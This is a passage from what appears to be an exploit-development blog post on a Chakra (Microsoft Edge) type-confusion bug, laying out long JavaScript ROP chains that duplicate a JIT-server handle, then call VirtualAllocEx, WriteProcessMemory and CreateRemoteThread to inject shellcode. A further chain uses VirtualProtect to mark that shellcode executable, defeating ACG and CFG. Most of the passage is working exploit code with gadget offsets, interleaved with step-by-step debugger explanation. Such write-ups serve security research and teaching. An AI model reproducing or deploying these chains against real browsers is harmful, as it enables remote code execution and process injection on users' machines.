// HANDLE hProcess (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which will hold full perms handle to JIT server
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (Place duplicated JIT handle into RCX)
next();                                                                     				   // Recall RAX already has a writable pointer in it

// Call KERNELBASE!VirtualAllocEx
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0xff00, kernelbaseHigh); // KERNELBASE!VirtualAllocEx address 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!VirtualAllocEx)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!VirtualAllocEx - 0x180243949: add rsp, 0x38 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)         
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000004, 0x00000000);             // DWORD flProtect (RSP+0x28) (PAGE_READWRITE)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();

// WriteProcessMemory() ROP chain
// Stage 3 -> Write our shellcode into the JIT process

// Store the VirtualAllocEx return address in the .data section of kernelbase.dll (It is currently in RAX)

/*
0:015> dq kernelbase+0x216000+0x4000 L2
00007fff`58cfa000  00000000`00000000 00000000`00000000
*/
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a000, kernelbaseHigh); // .data section of kernelbase.dll where we will store VirtualAllocEx allocation
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
next();

// SIZE_T nSize (R9)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00001000, 0x00000000);             // SIZE_T nSize (0x1000)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// HANDLE hProcess (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which holds our full perms handle to JIT server
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (Place duplicated JIT handle into RCX)
next();                                                                     // Recall RAX already has a writable pointer in it

// LPVOID lpBaseAddress (RDX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a000-0x8, kernelbaseHigh); // .data section of kernelbase.dll where we have our VirtualAllocEx allocation
next();                                                                            // (-0x8 to compensate for below where we have to read from the address at +0x8 offset
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x255fa0, chakraHigh);      // mov rdx, qword [rdx+0x08] ; mov rax, rdx ; ret
next();

// LPCVOID lpBuffer (R8) (shellcode in chakra.dll .data section)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x576231, chakraHigh);         // 0x180576231: pop r8 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74b000, chakraHigh);    	  // .data section of chakra.dll holding our shellcode
next();

// Call KERNELBASE!WriteProcessMemory
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x79a40, kernelbaseHigh); // KERNELBASE!WriteProcessMemory address 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!WriteProcessMemory)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!WriteProcessMemory - 0x180243949: add rsp, 0x38 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)         
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // SIZE_T *lpNumberOfBytesWritten (NULL) (RSP+0x28)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();

// CreateRemoteThread() ROP chain
// Stage 4 -> Create a thread within the JIT process, but create it suspended
// This will allow the thread to _not_ execute until we are ready
// LPTHREAD_START_ROUTINE can be set to anything, as CFG will check it and we will end up setting RIP directly later
// We will eventually hijack RSP of this thread with a ROP chain, and by setting RIP to a return gadget our thread, when executed, will return into our ROP chain
// We will update the thread later via another ROP chain to call SetThreadContext()

// LPTHREAD_START_ROUTINE lpStartAddress (R9)
// This can be any random data, since it will never be executed
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x28b4fe, chakraHigh);	   // 0x180043c63: Anything we want - this will never get executed
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// HANDLE hProcess (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which holds our full perms handle to JIT server
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (Place duplicated JIT handle into RCX)
next();

// LPSECURITY_ATTRIBUTES lpThreadAttributes (RDX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // NULL (default security properties)
next();

// SIZE_T dwStackSize (R8)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x576231, chakraHigh);      // 0x180576231: pop r8 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // 0 (default stack size)
next();

// Call KERNELBASE!CreateRemoteThread
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0xdcfd0, kernelbaseHigh); // KERNELBASE!CreateRemoteThread
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!CreateRemoteThread)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!CreateRemoteThread - 0x180243949: add rsp, 0x38 ; ret
next(); 
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // LPVOID lpParameter (RSP+0x28)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000004, 0x00000000);             // DWORD dwCreationFlags (RSP+0x30) (CREATE_SUSPENDED to avoid executing the thread routine)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // LPDWORD lpThreadId (RSP+0x38)
next();
```

You'll notice right off the bat the comment about `LPTHREAD_START_ROUTINE can be set to anything, as CFG will check it and we will end up setting RIP directly later`. This is very contradictory to what we just said about setting the thread's entry point to a ROP gadget, and just returning into the stack. I implore the reader to keep this mindset for now, as this is logical to think, but by the end of the blog post I hope it is clear to the reader that is a bit more nuanced than just setting the entry point to a ROP gadget. For now, this isn't a big deal.

Let's now see this in action. To make things easier, as we had been using `pop rcx` as a breakpoint up until this point, we will simply set a breakpoint on our `jmp rax` gadget and continue executing until we hit our `WriteProcessMemory` ROP chain (note our `jmp rax` gadget actually will always be called once before `DuplicateHandle`. This doesn't affect us at all and is just mentioned as a point of contention). We will then use `pt` to execute the call to `WriteProcessMemory`, until the `ret`, which will bring us into our `CreateRemoteThread` ROP chain.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion121.png" alt="">

Now that we have hit our `CreateRemoteThread` ROP chain, we will setup our `lpStartAddress` parameter, which will go in R9. We will first place a writable address in RAX so that our `mov r9, rcx` gadget (we will pop our intended value in RCX that we want `lpStartAddress` to be) will not cause an access violation.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion122.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion123.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion124.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion125.png" alt="">

Our call to `CreateRemoteThread` is in the current state:

```c
CreateRemoteThread(
	-
	-
	-
	addressof(ret_gadget),		// Function pointer we want to execute (when the thread eventually executes, we want it to just return to the stack)
	-
	-
	-
);
```

The next parameter we are going to knock out is the `hProcess` parameter - which is just the same handle to the JIT server with `PROCESS_ALL_ACCESS` that we have used several times already.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion126.png" alt="">

We can see we used `pop` to get the address of our JIT handle into RCX, and then we dereferenced RCX to get the _raw_ value of the handle into RCX. We also already had a writable value in RAX, so we "bypass" the operation which writes to the memory address contained in RAX (and it doesn't cause an access violation because the address is writable).

Our call to `CreateRemoteThread` is now in this state:

```c
CreateRemoteThread(
	fulljitHandle,			// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
	-
	-
	addressof(ret_gadget),		// Function pointer we want to execute (when the thread eventually executes, we want it to just return to the stack)
	-
	-
	-
);
```

After retrieving the handle of the JIT process, our next parameter we will fill in is the `lpThreadAttributes` parameter - which just requires a value of `0`. We can just directly write this value to the stack and use a `pop` operation to place the `0` value into RDX to essentially give our thread "normal" security attributes.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion127.png" alt="">

Easy as you'd like! Our call is now in the following state:

```c
CreateRemoteThread(
	fulljitHandle,			// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
	NULL,				// Default SECURITY_ATTRIBUTES
	-
	addressof(ret_gadget),		// Function pointer we want to execute (when the thread eventually executes, we want it to just return to the stack)
	-
	-
	-
);
```

Next up is the `dwStackSize` parameter. Again, we just want to use the default stack size (recall each thread has its own CPU register state, stack, etc.) - meaning we can specify `0` here.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion128.png" alt="">

We are now in the following state:

```c
CreateRemoteThread(
	fulljitHandle,			// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
	NULL,				// Default SECURITY_ATTRIBUTES
	0,				// Default Stack size
	addressof(ret_gadget),		// Function pointer we want to execute (when the thread eventually executes, we want it to just return to the stack)
	-
	-
	-
);
```

Since the rest of the parameters will be written to the stack RSP + `0x28`, `0x30`, `0x38`. So, we will now place `CreateRemoteThread` into RAX and use our write primitive to write our remaining parameters to the stack (setting all to `0` but setting the `dwCreationFlags` to `4` to create this thread in a suspended state).

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion129.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion130.png" alt="">

Our call is now in its final state:

```c
CreateRemoteThread(
	fulljitHandle,			// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
	NULL,				// Default SECURITY_ATTRIBUTES
	0,				// Default Stack size
	addressof(ret_gadget),		// Function pointer we want to execute (when the thread eventually executes, we want it to just return to the stack)
	NULL,				// No variable needs to be passed
	4,				// CREATE_SUSPENDED (Create the thread in a suspended state)
	NULL 				// Don't return the thread ID (we don't need it)
);
```

After executing the call, we get our return value which is a handle to the new thread which lives in the JIT server process.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion131.png" alt="">

Running Process Hacker as an administrator and viewing the `Handles` tab will show our returned handle is, in fact, a `Thread` handle and refers to the JIT server process.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion132.png" alt="">

If we then close out of the window (but not totally out of Process Hacker) we can examine the thread IT (TID) within the `Threads` tab of the JIT process to confirm where our thread is and what start address it will execute when the thread becomes non-suspended (e.g. resumed).

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion133.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion134.png" alt="">

As we can see, when this thread executes (it is currently suspended and not executing) it will perform a `ret`, which will load RSP into RIP (or will it? Keep reading towards the end and use critical thinking skills as to why this may not be the case!). Since we will eventually write our final ROP chain to RSP, this will kick off our last ROP chain which will mark our shellcode as RWX. Our next two ROP chains, which are fairly brief, will simply be used to update our final ROP chain. We now have a thread we can control in the process where ACG is disabled  - meaning we are inching closer.

`WriteProcessMemory` ROP Chain (Round 2)
---

Let's quickly take a look at our "final" ROP chain (which currently resides in the content process, where our exploit is executing):

```javascript
// VirtualProtect() ROP chain (will be called in the JIT process)
write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x577fd4, chakraHigh);         // 0x180577fd4: pop rax ; ret
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x72E128, chakraHigh);         // .data pointer from chakra.dll with a non-zero value to bypass cmp r8d, [rax] future gadget
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x46377, chakraHigh);          // 0x180046377: pop rcx ; ret
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x74e030, chakraHigh);         // PDWORD lpflOldProtect (any writable address -> Eventually placed in R9)
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0xf6270, chakraHigh);          // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x41414141, 0x41414141);                // Padding for add rsp, 0x28
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x41414141, 0x41414141);                // Padding for add rsp, 0x28
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x41414141, 0x41414141);                // Padding for add rsp, 0x28
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x41414141, 0x41414141);                // Padding for add rsp, 0x28
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x41414141, 0x41414141);                // Padding for add rsp, 0x28
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x46377, chakraHigh);          // 0x180046377: pop rcx ; ret
inc();

// Store the current offset within the .data section into a var
ropoffsetOne = countMe;

write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00000000, 0x00000000);                // LPVOID lpAddress (Eventually will be updated to the address we want to mark as RWX, our shellcode)
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x1d2c9, chakraHigh);          // 0x18001d2c9: pop rdx ; ret
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00001000, 0x00000000);                // SIZE_T dwSize (0x1000)
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x576231, chakraHigh);         // 0x180576231: pop r8 ; ret
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00000040, 0x00000000);                // DWORD flNewProtect (PAGE_EXECUTE_READWRITE)
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x577fd4, chakraHigh);         // 0x180577fd4: pop rax ; ret
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, kernelbaseLo+0x61700, kernelbaseHigh);  // KERNELBASE!VirtualProtect
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x272beb, chakraHigh);         // 0x180272beb: jmp rax (Call KERNELBASE!VirtualProtect)
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x118b9, chakraHigh);          // 0x1800118b9: add rsp, 0x18 ; ret
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x41414141, 0x41414141);                // Padding
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x41414141, 0x41414141);                // Padding
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x41414141, 0x41414141);                // Padding
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x4c1b65, chakraHigh);         // 0x1804c1b65: pop rdi ; ret
inc();

// Store the current offset within the .data section into a var
ropoffsetTwo = countMe;

write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00000000, 0x00000000);                // Will be updated with the VirtualAllocEx allocation (our shellcode)
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x1ef039, chakraHigh);         // 0x1801ef039: push rdi ; ret (Return into our shellcode)
inc();
```

This is a `VirtualProtect` ROP chain, which will mark the target pages as RWX. As we know we cannot _directly_ allocate and execute RWX pages via remote injection (`VirtualAllocEx` -> `WriteProcessMemory` -> `CreateRemoteThread`). So, instead, we will eventually leak the stack of our remote thread that exists within the JIT process (where ACG is disabled). When we resume the thread, our ROP chain will kick off and mark our shellcode as RWX. However, there is a slight problem with this. Let me explain.

We know our shellcode resides in the JIT process at whatever memory address `VirtualAllocEx` decided. However, our `VirtualProtect` ROP chain (shown above and at the beginning of this blog post) was embedded within the `.data` section of the content process (in order to store it, so we can inject it later when the time comes). The issue we are facing is that of a "runtime problem" as our `VirtualProtect` ROP chain has no way to know what address our shellcode will reside in via our `VirtualAllocEx` ROP chain. This is not only because the remote allocation occurs _after_ we have "preserved" our `VirtualProtect` ROP chain, but also because when `VirutalAllocEx` allocates memory, we request a "private" region of memory, which is "randomized", and is subject to change after each call to `VirtualAllocEx`. We can see this in the following gadget:

```javascript
write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x46377, chakraHigh);          // 0x180046377: pop rcx ; ret
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00000000, 0x00000000);                // LPVOID lpAddress (Eventually will be updated to the address we want to mark as RWX, our shellcode)
inc();
```

The above snippet is from our `VirtualProtect` ROP chain. When this ROP chain is stored before our _massive_ multiple ROP chains we have been walking through, starting with `DuplicateHandle` and overwriting our return address, the `VirtualProtect` ROP chain has no way to know where our shellcode is going to end up. `lpAddress` is a parameter that requires...

> The address of the starting page of the region of pages whose access protection attributes are to be changed.

The shellcode, which we inject into the remote JIT process, is the `lpAddress` we want to mark as RWX eventually. However, our `VirtualProtect` ROP chain just uses a placeholder for this value. What we are going to do is use _another_ call to `WriteProcessMemory` to update this address, at our exploit's runtime. You'll also notice the following snippet:

```javascript
// Store the current offset within the .data section into a var
ropoffsetOne = countMe;
```

These are simply variables (`ropoffsetOne`, `ropoffsetTwo`, `ropBegin`) that save the current location of our "counter", which is used to easily write gadgets 8 bytes at a time (we are on a 64-bit system, every pointer is 8 bytes). We "save" the current location in the ROP chain in a variable to allow us to easily write to it later. This will make more sense when we see the full call to `WriteProcessMemory` via ROP.

Here is how this call is setup:

```c
WriteProcessMemory(
	(HANDLE)0xFFFFFFFFFFFFFFFF, 				// Pseudo handle to the current process (the content process, when the exploit is executing)
	addressof(VirtualProtectROPChain_offset),		// Address of our return value from VirtualAllocEx (where we want to write the VirtualAllocEx_allocation address to)
	addressof(VirtualAllocEx_Allocation),			// Address of our VirtualAllocEx allocation (where our shellcode resides in the JIT process at this point in the exploit)
	0x8							// 64-bit pointer size (sizeof(QWORD)))
	NULL 							// Optional
);
```

Our ROP chain simply will write the address of our shellcode, in the remote JIT process (allocated via `VirtualAllocEx`) to our "final" `VirtualProtect` ROP chain so that the `VirtualProtect` ROP chain knows what pages to mark RWX. This is achieved via ROP, as seen below (including all previous ROP chains):

```javascript
// alert() for debugging
alert("DEBUG");

// Store the value of the handle to the JIT server by way of chakra!ScriptEngine::SetJITConnectionInfo (chakra!JITManager+s_jitManager+0x8)
jitHandle = read64(chakraLo+0x74d838, chakraHigh);

// Helper function to be called after each stack write to increment offset to be written to
function next()
{
    counter+=0x8;
}

// Begin ROP chain
// Since __fastcall requires parameters 5 and so on to be at RSP+0x20, we actually have to put them at RSP+0x28
// This is because we don't push a return address on the stack, as we don't "call" our APIs, we jump into them
// Because of this we have to compensate by starting them at RSP+0x28 since we can't count on a return address to push them there for us

// DuplicateHandle() ROP chain
// Stage 1 -> Abuse PROCESS_DUP_HANDLE handle to JIT server by performing DuplicateHandle() to get a handle to the JIT server with full permissions
// ACG is disabled in the JIT process
// https://bugs.chromium.org/p/project-zero/issues/detail?id=1299

// Writing our ROP chain to the stack, stack+0x8, stack+0x10, etc. after return address overwrite to hijack control-flow transfer

// HANDLE hSourceProcessHandle (RCX) _should_ come first. However, we are configuring this parameter towards the end, as we need RCX for the lpTargetHandle parameter

// HANDLE hSourceHandle (RDX)
// (HANDLE)-1 value of current process
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Pseudo-handle to current process
next();

// HANDLE hTargetProcessHandle (R8)
// (HANDLE)-1 value of current process
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x24628b, chakraHigh);      // 0x18024628b: mov r8, rdx ; add rsp, 0x48 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();

// LPHANDLE lpTargetHandle (R9)
// This needs to be a writable address where the full JIT handle will be stored
// Using .data section of chakra.dll in a part where there is no data
/*
0:053> dqs chakra+0x72E000+0x20010
00007ffc`052ae010  00000000`00000000
00007ffc`052ae018  00000000`00000000
*/
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72e128, chakraHigh);      // .data pointer from chakra.dll with a non-zero value to bypass cmp r8d, [rax] future gadget
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which will hold full perms handle to JIT server;
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// HANDLE hSourceProcessHandle (RCX)
// Handle to the JIT process from the content process
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], jitHandle[0], jitHandle[1]);         // PROCESS_DUP_HANDLE HANDLE to JIT server
next();

// Call KERNELBASE!DuplicateHandle
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], duplicateHandle[0], duplicateHandle[1]); // KERNELBASE!DuplicateHandle (Recall this was our original leaked pointer var for kernelbase.dll)
next();
